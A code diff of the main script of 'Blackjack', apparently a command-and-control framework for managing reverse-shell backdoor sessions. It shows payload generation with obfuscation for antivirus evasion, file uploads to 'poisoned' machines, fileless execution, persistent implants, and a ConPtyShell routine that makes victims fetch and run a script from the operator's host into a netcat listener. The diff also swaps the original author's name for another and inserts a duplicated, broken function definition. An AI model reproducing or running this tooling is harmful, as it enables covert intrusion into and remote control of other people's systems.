@@ -1,43 +1,42 @@
 #!/usr/bin/env python3
 #
-# Author: Panagiotis Chartas (r0jahsm0ntar1) 
+# Author: Rojahs Montari (r0jahsm0ntar1) 
 #
-# This script is part of the blackjack framework: 
-# https://github.com/r0jahsm0ntar1/blackjack
+# This script is part of the Blackjack framework: 
+# https://github.com/r0jahsm0ntar1/africana-framework
+
 
 import argparse
 from subprocess import check_output
 from Core.common import *
-from Core.settings import blackjack_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
+from Core.settings import Blackjack_Settings, Core_Server_Settings, TCP_Sock_Handler_Settings, File_Smuggler_Settings, Loading
 from Core.logging import clear_metadata
 from hashlib import md5
 from requests import get as requests_get
-
 
 # -------------- Arguments -------------- #
 parser = argparse.ArgumentParser()
 
 parser.add_argument("-p", "--port", action="store", help = "Team server port (default: 6501).", type = int)
-parser.add_argument("-x", "--afric-port", action="store", help = "blackjack server port (default: 8080 via http, 443 via https).", type = int)
+parser.add_argument("-x", "--blackjack-port", action="store", help = "BlackJack server port (default: 8080 via http, 443 via https).", type = int)
 parser.add_argument("-n", "--netcat-port", action="store", help = "Netcat multi-listener port (default: 4443).", type = int)
 parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http file smuggler server port (default: 8888).", type = int)
-parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any blackjack client (sibling server) to connect to your instance without prompting you for verification.")
-parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for blackjack https server).")
-parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for blackjack https server).")
-#parser.add_argument("-s", "--skip-update", action="store_true", help = "Do not check for updates on startup.")
+parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Blackjack client (sibling server) to connect to your instance without prompting you for verification.")
+parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for BlackJack https server).")
+parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for BlackJack https server).")
+parser.add_argument("-s", "--skip-update", action="store_true", help = "Do not check for updates on startup.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
 args = parser.parse_args()
-args.skip_update = True
 
 # Parse the bind ports of servers & listeners
-blackjack_Settings.certfile = args.certfile
-blackjack_Settings.keyfile = args.keyfile
-blackjack_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
-blackjack_Settings.bind_port = args.afric_port if args.afric_port else blackjack_Settings.bind_port
+Blackjack_Settings.certfile = args.certfile
+Blackjack_Settings.keyfile = args.keyfile
+Blackjack_Settings.ssl_support = True if (args.certfile and args.keyfile) else False
+Blackjack_Settings.bind_port = args.blackjack_port if args.blackjack_port else Blackjack_Settings.bind_port
 
-if blackjack_Settings.ssl_support:
-    blackjack_Settings.bind_port_ssl = args.afric_port if args.afric_port else blackjack_Settings.bind_port_ssl
+if Blackjack_Settings.ssl_support:
+    Blackjack_Settings.bind_port_ssl = args.blackjack_port if args.blackjack_port else Blackjack_Settings.bind_port_ssl
 
 Core_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port
 TCP_Sock_Handler_Settings.bind_port = args.netcat_port if args.netcat_port else TCP_Sock_Handler_Settings.bind_port
@@ -46,10 +45,10 @@ File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler
 # Check if there are port number conflicts
 defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]
 
-if blackjack_Settings.ssl_support:
-    defined_ports.append(blackjack_Settings.bind_port_ssl)
+if Blackjack_Settings.ssl_support:
+    defined_ports.append(Blackjack_Settings.bind_port_ssl)
 else:
-    defined_ports.append(blackjack_Settings.bind_port)
+    defined_ports.append(Blackjack_Settings.bind_port)
 
 if check_list_for_duplicates(defined_ports):
     exit(f'[{DEBUG}] The port number of each server/handler must be different.')
@@ -63,7 +62,7 @@ from Core.blackjack_core import *
 
 # -------------- Functions & Classes -------------- #
 
-def haxor_print(text, leading_spaces = 0):
+def africs_print(text, leading_spaces = 0):
 
     text_chars = list(text)
     current, mutated = '', ''
@@ -82,6 +81,9 @@ def haxor_print(text, leading_spaces = 0):
 
 
 
+def print_banner():
+    
+    print('\r')
 def print_banner():
     os.system('clear')
     print(fr'''{GREEN}
@@ -111,21 +113,19 @@ def print_banner():
 def print_meta():
     print(f'{BLUE}   ~>[ blackjack C3 - Part of africana-framework ]<~{END}')
     print(f'{BLUE} ~>[ Subscribe ] https://youtube.com/@RojahsMontari ]<~{END}\n')
-    print('           ~>[ Managed By r0jahsm0ntar1 ]<~')
+    print(f'{BLUE}             [ {END}Managed By r0jahsm0ntar1 {BLUE}]{END}\n')
 
-    print('                 ~[ Version:  0xJ ]~')
-    print('                 ~[ Shells :    8 ]~')
-    print('                 ~[ Implants:   0 ]~\n')
-
-
+    print(f'{BLUE}                  [ {END}Version:  0xJ {BLUE}]{END}')
+    print(f'{BLUE}                  [ {END}Shells :    8 {BLUE}]{END}')
+    print(f'{BLUE}                  [ {END}Implants:   0 {BLUE}]{END}\n')
 
 class PrompHelp:
     
     commands = {
-
+    
         'connect' : {
-            'details' : f'''             
-Connect with another instance of blackjack (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a blackjack instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list blackjack related services info. Read the Usage Guide or check my YouTube channel (@HaxorTechTones) for details.
+            'details' : f'''
+Connect with another instance of Blackjack (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Blackjack instance can have (adjustable). In case you forgot the team server port number (default: 6501), use "sockets" to list Blackjack related services info. Read the Usage Guide or check my YouTube channel (@RojahsMontari) for details.
 
 connect <IP> <TEAM_SERVER_PORT>''',
             'least_args' : 2,
@@ -135,7 +135,7 @@ connect <IP> <TEAM_SERVER_PORT>''',
                 
         'generate' : {
             'details' : f'''         
-Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in blackjack/Core/payload_templates and edit or create your own.
+Generate a reverse shell command. This function has been redesigned to use payload templates, which you can find in Blackjack/Core/payload_templates and edit or create your own.
 
 Main logic:
 generate payload=<OS_TYPE/HANDLER/PAYLOAD_TEMPLATE> lhost=<IP or INTERFACE> [ obfuscate encode ]
@@ -146,7 +146,7 @@ generate payload=linux/blackjack/sh_curl lhost=eth0
 
 - The ENCODE and OBFUSCATE attributes are enabled for certain templates and can be used during payload generation. 
 - For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
-- To catch blackjack https-based reverse shells you need to start blackjack with SSL.
+- To catch BlackJack https-based reverse shells you need to start Blackjack with SSL.
 - Ultimately, one should edit the templates and add obfuscated versions of the commands for AV evasion.''',
             'least_args' : 0, # Intentionally set to 0 so that the Payload_Generator class can inform users about missing arguments
             'max_args' : 7
@@ -167,7 +167,7 @@ exec <COMMAND or LOCAL FILE PATH> <SESSION ID or ALIAS>
 
         'repair' : {
             'details' : f'''             
-Use this command to manually correct a backdoor session's hostname/username value, in case blackjack does not interpret the information correctly when the session is established.
+Use this command to manually correct a backdoor session's hostname/username value, in case Blackjack does not interpret the information correctly when the session is established.
      
 repair <SESSION ID or ALIAS> <HOSTNAME or USERNAME> <NEW VALUE>''',
             'least_args' : 3,
@@ -223,14 +223,14 @@ kill <SESSION ID or ALIAS>''',
         'siblings' : {
             'details' : f'''
 Print info about connected Sibling Servers. 
-Siblings are basically other instances of blackjack that you are connected with.''',
+Siblings are basically other instances of Blackjack that you are connected with.''',
             'least_args' : 0,
             'max_args' : 0
         },
 
         'threads' : {
             'details' : f'''
-blackjack creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file blackjack/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by blackjack, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
+Blackjack creates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file Blackjack/Core/settings.py there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads created by Blackjack, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
   
 Note that, if the thread limiter reaches 0, weird things will start happening as new threads (e.g. backdoor sessions) will be queued until: thread limiter > 0.''',
             'least_args' : 0,
@@ -250,7 +250,7 @@ Note that, if the thread limiter reaches 0, weird things will start happening as
         },
 
         'sockets' : {
-            'details' : f'''Prints blackjack related socket services info.''',
+            'details' : f'''Prints Blackjack related socket services info.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -263,7 +263,7 @@ Note that, if the thread limiter reaches 0, weird things will start happening as
 
         'upload' : {
             'details' : f'''
-Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from blackjack's main prompt as well as the pseudo shell terminal.
+Upload files to a poisoned machine (files are auto-requested from the http file smuggler). The feature works regardless if the session is owned by you or a sibling server. You can run the command from Blackjack's main prompt as well as the pseudo shell terminal.
 
 From the main prompt:
 upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH> <SESSION ID or ALIAS>
@@ -276,7 +276,7 @@ upload <LOCAL_FILE_PATH> <REMOTE_FILE_PATH>''',
 
         'cmdinspector' : {
             'details' : f'''
-blackjack has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
+Blackjack has a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
 Use the cmdinspector command to turn that feature on/off. 
 
 cmdinspector <ON / OFF>''',
@@ -286,7 +286,7 @@ cmdinspector <ON / OFF>''',
 
         'conptyshell' : {
             'details' : f'''
-Automatically runs Invoke-ConPtyShell against a session. A new terminal window with netcat listening will pop up and the script will be executed on the target as a new process, meaning that, you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe sessions.
+Automatically runs Invoke-ConPtyShell against a session. A new terminal window with netcat listening will pop up (you need to have gnome-terminal installed) and the script will be executed on the target as a new process, meaning that, you get a fully interactive shell AND you get to keep your backdoor. Currently works only for powershell.exe sessions.
 Because I love Invoke-ConPtyShell.
 
 Usage: 
@@ -302,7 +302,7 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
         },
 
         'flee' : {
-            'details' : f'''Quit without terminating active sessions. When you start blackjack again, if any blackjack implant is still running on previously injected hosts, the session(s) will be re-established.''',
+            'details' : f'''Quit without terminating active sessions. When you start Blackjack again, if any BlackJack implant is still running on previously injected hosts, the session(s) will be re-established.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -314,7 +314,7 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
         },
 
         'purge' : {
-            'details' : f'''blackjack automatically stores information regarding generated implants and loads them in memory every time it starts. This way, blackjack generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
+            'details' : f'''Blackjack automatically stores information regarding generated implants and loads them in memory every time it starts. This way, BlackJack generated implants become reusable and it is possible to re-establish older sessions, assuming the payload is still running on the victim(s). Use this command to delete all session related metadata. It does not affect any active sessions you may have.''',
             'least_args' : 0,
             'max_args' : 0
         },
@@ -335,7 +335,7 @@ conptyshell <IP or INTERFACE> <PORT> <SESSION ID or ALIAS>''',
         \r  siblings             Print sibling servers data table.
         \r  sessions             Print established backdoor sessions data table.
         \r  backdoors            Print established backdoor types data table.
-        \r  sockets              Print blackjack related running services' info.
+        \r  sockets              Print Blackjack related running services' info.
         \r  shell        [+]     Enable an interactive pseudo-shell for a session.
         \r  exec         [+]     Execute command/file against a session.
         \r  upload       [+]     Upload files to a backdoor session.
@@ -647,7 +647,7 @@ class Completer(object):
             else:
                 
                 # Autofill session id if only one active session
-                #if Sessions_Manager.active_sessions:
+                # if Sessions_Manager.active_sessions:
 
                 #     id_already_set = any(re.search(id, line_buffer_val) for id in Sessions_Manager.active_sessions.keys())
 
@@ -723,6 +723,7 @@ class Completer(object):
 
     
 def main():
+
     chill() if args.quiet else print_banner()
     current_wd = os.path.dirname(os.path.abspath(__file__))
     
@@ -732,11 +733,12 @@ def main():
         try:
             local_files_path = current_wd + os.sep
             branch = 'main' 
-            url = f'https://api.github.com/repos/r0jahsm0ntar1/blackjack/git/trees/{branch}?recursive=1'
-            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/blackjack/{branch}/'        
+            url = f'https://api.github.com/repos/r0jahsm0ntar1/Blackjack/git/trees/{branch}?recursive=1'
+            raw_url = f'https://raw.githubusercontent.com/r0jahsm0ntar1/Blackjack/{branch}/'        
             Loading.active = True
             loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
 
+            
             def get_local_file_hash(filename):
                 
                 try:
@@ -757,6 +759,8 @@ def main():
                         
                 except:
                     return False
+        
+        
             try:
                 response = requests_get(url = url, timeout=(5, 27))
                 response.raise_for_status()  # raises stored HTTPError, if one occurred
@@ -799,7 +803,7 @@ def main():
                             
                             if not updated:
                                 Loading.stop()
-                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling blackjack.')
+                                print(f'\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Blackjack.')
                                 exit(1)
                                 
                 if update_consent:
@@ -816,7 +820,7 @@ def main():
             pass
             
     # Initialize essential services
-    print(f'{BLUE}        ~>[ Initializing required services ]<~{END}\n')
+    print(f'{BLUE}         ~>[{END}{DARKCYAN} Initializing required services {BLUE}]<~{END}\n')
 
     ''' Init Core '''
     core = Core_Server()
@@ -860,11 +864,11 @@ def main():
         sys.exit(1)
     
     
-    ''' Init blackjack Engine '''
-    initiate_afric_server()
+    ''' Init Blackjack Engine '''
+    initiate_blackjack_server()
     payload_engine = Payload_Generator()
     sessions_manager = Sessions_Manager()
-    blackjack.server_unique_id = core.return_server_uniq_id()
+    Blackjack.server_unique_id = core.return_server_uniq_id()
 
 
     ''' Init File Smuggler '''
@@ -899,7 +903,7 @@ def main():
 
             try:
                 Core_Server.announce_server_shutdown()
-                blackjack.terminate() if not flee else do_nothing()
+                Blackjack.terminate() if not flee else do_nothing()
                 core.stop_listener()
 
             except:
@@ -907,9 +911,7 @@ def main():
             
             finally:
                 #print() if bound else print('\n')
-                #print(f'{BLUE}-[        blackjack C3 - COM Command & Control        ]- {END}')
-                #print(f'{BLUE}-[   Managed By r0jahsm0ntar1 in africana-framework   ]- {END}')
-                #print(f'{BLUE}-[   https://youtube.com/@RojahsMontari [Subscribe]   ]- {END}')
+                #print_meta()
                 sys.exit(0)
 
         return
@@ -1103,7 +1105,7 @@ def main():
                                     
                                     if session_owner_id == core.return_server_uniq_id():
                                         File_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \
-                                            else blackjack.command_pool[session_id].append(execution_object)
+                                            else Blackjack.command_pool[session_id].append(execution_object)
                                     
                                     else:
                                         core.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \
@@ -1146,7 +1148,7 @@ def main():
 
                         if not shell_occupied:                    
                             os_type = sessions_manager.active_sessions[session_id]['OS Type']
-                            blackjack.activate_pseudo_shell_session(session_id, os_type)
+                            Blackjack.activate_pseudo_shell_session(session_id, os_type)
                             
                         else:
                             print(f'\r[{INFO}] This session is currently being used by a sibling server.')
@@ -1413,7 +1415,7 @@ def main():
                         #       went wrong, the user would not receive stderr.
                         #    2) Run as a new process, given that the first pre-flight check didn't error out.
 
-                        # Construct blackjack issued command to request and exec ConPtyShell
+                        # Construct Blackjack issued command to request and exec ConPtyShell
                         rand_key = get_random_str(5)
                         value_name = get_random_str(5)
                         script_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'
@@ -1436,9 +1438,9 @@ def main():
                             blackjack_cmd['issuer'] = 'self'
 
                             # Start listener
-                            os.system(f'x-terminal-emulator -e bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
+                            os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                             sleep(0.2)
-                            blackjack.command_pool[session_id].append(blackjack_cmd)
+                            Blackjack.command_pool[session_id].append(blackjack_cmd)
 
                         else:
 
@@ -1450,7 +1452,7 @@ def main():
                             
                             if verified.lower().strip() in ['y', 'yes']:
                                 # Start listener
-                                os.system(f'x-terminal-emulator -e bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
+                                os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
                                 blackjack_cmd['issuer'] = core.return_server_uniq_id()
                                 Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, blackjack_cmd)
                                         
